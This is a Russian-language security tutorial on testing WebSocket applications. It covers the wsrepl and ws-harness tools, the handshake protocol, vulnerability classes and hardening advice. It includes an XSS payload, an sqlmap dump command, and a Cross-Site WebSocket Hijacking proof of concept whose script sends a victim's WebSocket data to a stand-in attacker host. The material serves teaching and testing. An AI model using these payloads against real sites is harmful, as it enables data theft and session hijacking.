# **Веб-сокеты (Web Sockets)**

> `WebSocket` — это коммуникационный протокол, обеспечивающий полнодуплексную связь по одному долгоживущему соединению. Это позволяет реализовать обмен данными в реальном времени между клиентами (обычно веб-браузерами) и серверами через постоянное соединение. Веб-сокеты широко используются в веб-приложениях, которым требуются частые обновления с низкой задержкой, например, в чатах, онлайн-играх, системах уведомлений в реальном времени и торговых платформах.

### **Использование wsrepl**

* `wsrepl` — инструмент, разработанный компанией Doyensec, предназначен для упрощения аудита приложений, использующих веб-сокеты. Он предлагает интерактивный REPL-интерфейс, удобный для пользователя и легко автоматизируемый. Инструмент был создан в ходе работы с клиентом, чьё веб-приложение активно использовало веб-сокеты для мягкой передачи данных в реальном времени.

> wsrepl сочетает интерактивность REPL с возможностями автоматизации. Он построен на базе Python-фреймворка для TUI — Textual, поддерживает аргументы, совместимые с curl, что упрощает переход от запроса на обновление (Upgrade) в Burp к использованию wsrepl. Также инструмент обеспечивает полную прозрачность opcode'ов веб-сокетов в соответствии с RFC 6455 и имеет функцию автоматического переподключения в случае обрыва связи.

* **Установка и запуск**:
```
pip install wsrepl
wsrepl -u URL -P auth_plugin.py
```

Кроме того, wsrepl упрощает переход к автоматизации работы с веб-сокетами. Достаточно написать плагин на Python. Система плагинов гибкая: пользователь может определять хуки, которые выполняются на разных этапах жизненного цикла WebSocket (инициализация, отправка сообщения, получение сообщения и т.д.).

* **Пример плагина:**
```python
from wsrepl import Plugin
from wsrepl.WSMessage import WSMessage

import json
import requests

class Demo(Plugin):
    def init(self):
        token = requests.get("https://example.com/uuid").json()["uuid"]
        self.messages = [
            json.dumps({
                "auth": "session",
                "sessionId": token
            })
        ]

    async def on_message_sent(self, message: WSMessage) -> None:
        original = message.msg
        message.msg = json.dumps({
            "type": "message",
            "data": {
                "text": original
            }
        })
        message.short = original
        message.long = message.msg

    async def on_message_received(self, message: WSMessage) -> None:
        original = message.msg
        try:
            message.short = json.loads(original)["data"]["text"]
        except:
            message.short = "Ошибка: не удалось разобрать сообщение"

        message.long = original
```

### **Использование ws-harness.py**

`ws-harness` - для прослушивания веб-сокета, указав шаблон сообщения для отправки на конечную точку

```
python ws-harness.py -u "ws://dvws.local:8080/authenticate-user" -m ./message.txt
```

Содержимое файла сообщения должно содержать ключевое слово **[FUZZ]**:

```json
{
    "auth_user":"dGVzda==",
    "auth_pass":"[FUZZ]"
}
```

Затем можно использовать любые инструменты против созданного веб-сервиса, который работает как прокси и на лету изменяет содержимое сообщений, передаваемых через веб-сокет.

* **Пример с sqlmap:**
```
sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
```

# Протокол WebSocket

Веб-сокеты начинаются как обычный HTTP-запрос, после чего соединение переключается на использование протокола WebSocket.

Клиент отправляет специально сформированный HTTP-запрос с заголовками, указывающими на желание переключиться на протокол WebSocket:

```python
GET /chat HTTP/1.1
Host: example.com:80
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

Сервер отвечает статусом **HTTP 101 Switching Protocols**, если он принимает запрос:

```python
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```
* Заголовки `Connection` и `Upgrade` в запросе и ответе указывают, что это рукопожатие WebSocket.
* Заголовок запроса `Sec-WebSocket-Version` - указывает версию протокола WebSocket, которую клиент хочет использовать. Обычно это 13.
* Заголовок запроса `Sec-WebSocket-Key` - содержит случайное значение в кодировке Base64, которое должно случайным образом генерироваться в каждом запросе рукопожатия чтобы не было кеширования и ошибок.
* Заголовок ответа `Sec-WebSocket-Accept` - подтверждение, что сервер понял запрос. содержит хэш значения, отправленного в заголовке запроса `Sec-WebSocket-Key`, объединенного с определенной строкой, определенной в спецификации протокола. Это делается для предотвращения вводящих в заблуждение ответов, возникающих из-за неправильно настроенных серверов или кэширующих прокси-серверов.


### **SocketIO**
> Socket.IO — это библиотека JavaScript (как для клиента, так и для сервера), предоставляющая высокоуровневую абстракцию поверх веб-сокетов. Она призвана упростить и сделать более надёжной передачу данных в реальном времени в различных браузерах и средах.

## **Уязвимости безопасности WebSockets**

* Вводимые пользователем данные, передаваемые на сервер, могут обрабатываться небезопасными способами, что приводит к таким уязвимостям, как внедрение SQL или внедрение внешних сущностей XML.
* Некоторые скрытые уязвимости, достигаемые через WebSockets, могут быть обнаружены только с использованием внеполосных (OAST) методов.
* Если контролируемые злоумышленником данные передаются через WebSockets другим пользователям приложения, это может привести к XSS или другим уязвимостям на стороне клиента.

[Прим.](#Прим)
> OAST метод - поиска уязвимостей, при котором ты не видишь ответ сервера сразу в своём запросе, а ждёшь, что сервер сам обратится к тебе (например, по DNS или HTTP) — и это будет доказательством уязвимости.

### Манипулирование сообщениями WebSocket для эксплуатации уязвимостей

* Содержимое сообщения передается через `WebSockets` другому пользователю чата и отображается в браузере пользователя следующим образом:

```<td>Привет, Кто-то</td>```

При условии отсутствия какой-либо другой обработки ввода или защиты, можно выполнить атаку XSS.
```{"message":"<img src=1 onerror='alert(1)'>"}```

### Манипуляция рукопожатием WebSocket для эксплуатации уязвимостей

- Может позволить получить доступ к большей поверхности атаки.
- Некоторые атаки могут привести к разрыву вашего соединения, поэтому потребуется установить новое.
- Токены или другие данные в исходном запросе рукопожатия могут устареть, и их потребуется обновить.

Некоторые уязвимости WebSockets можно обнаружить и использовать только путем манипулирования рукопожатием WebSocket. Эти уязвимости, как правило, связаны с недостатками дизайна, такими как:

* Неправильное доверие к заголовкам HTTP для принятия решений по безопасности, таким как заголовок X-Forwarded-For.
* Недостатки в механизмах обработки сеансов, поскольку контекст сеанса, в котором обрабатываются сообщения WebSocket, обычно определяется контекстом сеанса сообщения о рукопожатии.
* Поверхность атаки, представленная пользовательскими заголовками HTTP, используемыми приложением.

Помимо управления сообщениями WebSocket, иногда необходимо управлять рукопожатием WebSocket, которое устанавливает соединение.

### **В Burp**
> клонирование открытого WebSocket-соединения или переподключение к разорванному соединению, мастер покажет полные детали запроса рукопожатия WebSocket, которые жожно редактировать по мере необходимости перед выполнением рукопожатия.


### Перехват межсайтового WebSocket (CSWSH)

> Если рукопожатие WebSocket не защищено должным образом с помощью CSRF-токена или одноразового числа (nonce), можно использовать аутентифицированное WebSocket-соединение пользователя на своём сайте, поскольку браузер автоматически отправляет cookies. Эта атака называется **Cross-Site WebSocket Hijacking( CSWSH)**.


* **Условия для атаки:**
 * Рукопожатие WebSocket использует **только cookies** для аутентификации.
 * Нет CSRF-токена или другого непредсказуемого параметра.

* **Что даёт атака:**
 * Отправлять сообщения от имени жертвы (действия)
 * Читать ответы сервера (кража данных)
  
**Пример эксплойта**, размещённого на сервере злоумышленника, который похищает полученные данные из WebSocket и отправляет их злоумышленнику:

```html
<script>
  ws = new WebSocket('wss://vulnerable.example.com/messages');
  ws.onopen = function start(event) {
    ws.send("HELLO");
  }
  ws.onmessage = function handleReply(event) {
    fetch('https://attacker.example.net/?' + event.data, {mode: 'no-cors'});
  }
  ws.send("Some text sent to the server");
</script>
```

> Нужно адаптировать код под конкретную ситуацию. Например, если веб-приложение использует заголовок `Sec-WebSocket-Protocol` в запросе рукопожатия, нужно добавить это значение в качестве второго параметра при вызове функции WebSocket, чтобы добавить этот заголовок.

# Как защитить соединение WebSocket

* Использовать протокол wss:// (WebSockets через TLS).
* Жестко закодировать URL конечной точки WebSockets и не включать в этот URL данные, контролируемые пользователем.
* Защитить сообщение о рукопожатии WebSocket от CSRF, чтобы избежать уязвимостей кросс-сайтового перехвата WebSockets.
* Относится к данным, полученным через WebSocket, как к недоверенным в обоих направлениях.
* Обрабатывать данные безопасно как на стороне сервера, так и на стороне клиента, чтобы предотвратить уязвимости, основанные на вводе, такие как SQL-инъекция и межсайтовый скриптинг.
